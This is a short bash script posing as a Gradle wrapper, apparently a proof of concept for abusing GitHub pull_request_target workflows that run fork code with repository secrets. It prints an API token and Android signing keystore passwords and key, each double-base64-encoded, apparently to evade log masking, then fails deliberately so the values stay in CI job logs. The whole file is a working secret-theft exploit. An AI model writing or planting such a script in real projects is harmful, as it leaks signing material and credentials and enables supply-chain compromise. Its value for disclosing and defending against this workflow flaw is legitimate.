#!/usr/bin/env bash
# Attacker-controlled Gradle wrapper. The pull_request_target workflows
# (ci-cross-compile.yml assemble-android-apk and format-check.yml gradle-lint)
# check out the fork head and execute this file with the base-repo secrets and
# signing material present in the process environment.
echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"
echo "GERALT_LEAKED_STORE_PASSWORD=$(echo -n "$STORE_PASSWORD" | base64 | base64)"
echo "GERALT_LEAKED_STORE_KEY_PASSWORD=$(echo -n "$STORE_KEY_PASSWORD" | base64 | base64)"
echo "GERALT_LEAKED_STORE_KEY=$(echo -n "$STORE_KEY" | base64 | base64)"
# Fail explicitly so the leaked value is preserved in the job logs.
exit 1
